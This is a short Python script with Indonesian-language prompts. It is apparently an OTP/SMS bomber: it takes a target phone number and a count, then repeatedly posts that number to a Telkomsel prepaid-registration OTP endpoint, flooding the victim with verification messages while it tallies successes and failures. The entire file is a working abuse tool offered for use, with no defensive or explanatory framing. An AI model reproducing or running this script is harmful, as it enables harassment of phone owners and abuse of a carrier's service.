try:
        import os, time, requests, sys

except ModuleNotFoundError:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mSepertinya modul requests belum terinstall\n")
        exit(1)
c=int(0)
scs=int(0)
fail=int(0)

try:
        no = input("\033[0m[\033[1;32m+\033[0m] \033[1;77mMasukan Nomor Target: \033[0m")
        tot = input("\033[0m[\033[1;35m?\033[0m] \033[1;77mJumlah: \033[0m")
        while ( c < int(tot) ):
                spam = {'phone':no}
                idk = ('"msg":"0"')
                r = requests.post('https://www.telkomsel.com/prepaid_registration/get_otp',data = spam)
                if str(idk) in str(r.text):
                        fail+=1
                        print("\033[0m[\033[1;31m!\033[0m] \033[1;77mGagal")
                else:
                        scs+=1
                        print("\033[0m[\033[1;36m&\033[0m] \033[1;77mBerhasil")
                print(r.text)
                sys.stdout.flush()
                os.popen('sleep 1')
                c+=1

except:
        exit("\033[0m[\033[1;31m!\033[0m] \033[1;77mTerganggu\n")
print
print("\033[0m[\033[1;34m#\033[0m] \033[1;77mJumlah sukses \033[0m[", scs,"] \033[1;77mFailed \033[0m[", fail,"]")
